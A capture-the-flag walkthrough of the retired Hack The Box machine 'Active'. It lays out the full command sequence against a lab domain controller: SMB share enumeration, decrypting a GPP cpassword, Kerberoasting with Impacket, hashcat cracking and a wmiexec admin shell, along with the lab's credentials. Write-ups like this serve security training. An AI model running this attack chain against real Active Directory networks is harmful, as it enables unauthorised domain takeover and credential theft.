Active is a retired Windows box that focuses on Active Directory enumeration, credential exposure via Group Policy Preferences (GPP), and abuse of Kerberos through Kerberoasting to pivot from a service account to domain administrator.

## Recon
### Nmap — Port Discovery
Begin with a full TCP sweep to identify all open ports on the target.

`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`

![](/assets/img/htb/Active/active01.png)

Parse the results to store all open ports in a variable for follow-up scanning.

`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`

---

### Nmap — Service Enumeration
Run a targeted service and script scan against only the discovered open ports.

`sudo nmap -sC -sV -p $ports 10.129.17.166 -oN scans/services.txt -Pn`

---

### Host Resolution
Add the target hostname to /etc/hosts.

`echo '10.129.18.74 active.htb' | sudo tee -a /etc/hosts`

---

## Service Enumeration
### SMB
AD is confirmed. Enumerate SMB with NetExec for any open shares.

`nxc smb 10.129.18.74 -u '' -p '' --shares`

![](/assets/img/htb/Active/active03.png)

SMB shows a readable share called Replication. use `smbclient` to pull the share.

`mkdir -p Replication && cd Replication`

`smbclient //10.129.18.74/Replication -N -I 10.129.18.74 -c "recurse; prompt; mget *"`

![](/assets/img/htb/Active/active05.png)

Inspect what was pulled down.
`tree -a -h -f --dirsfirst`

## Initial Access
Inside is a Groups.xml file — a classic GPP artifact known to store recoverable credentials. 

`grep -i cpassword Groups.xml`

![](/assets/img/htb/Active/active065.png)

Discovered username `SVC_TGS`.
Decrypt the embedded cpassword to recover the service account password.

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

![](/assets/img/htb/Active/active06.png)

Validate access with the recovered account:

`nxc smb 10.129.18.74 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares`

![](/assets/img/htb/Active/active07.png)

---

## Privilege Escalation
### Kerberoasting
With valid credentials, perform a Kerberoasting attack to pull crackable service tickets for any high-privilege accounts.

`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.18.74 -request -outputfile tgs_hashes.txt`

![](/assets/img/htb/Active/active08.png)

Crack the Kerberos ticket with `hashcat`.

`hashcat -m 13100 tgs_hashes.txt /home/user/tools/rockyou.txt -a 0`

![](/assets/img/htb/Active/active09.png)

The ticket cracked to domain admin credentials, which I verified over SMB.

`nxc smb 10.129.18.74 -u 'active.htb\Administrator' -p 'Ticketmaster1968' --shares`

![](/assets/img/htb/Active/active10.png)

With admin credentials confirmed, I used WMIExec to get an interactive shell.

`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'ACTIVE.HTB/Administrator:Ticketmaster1968'@10.129.18.74`

![](/assets/img/htb/Active/active11.png)

From here, you can get the flags.
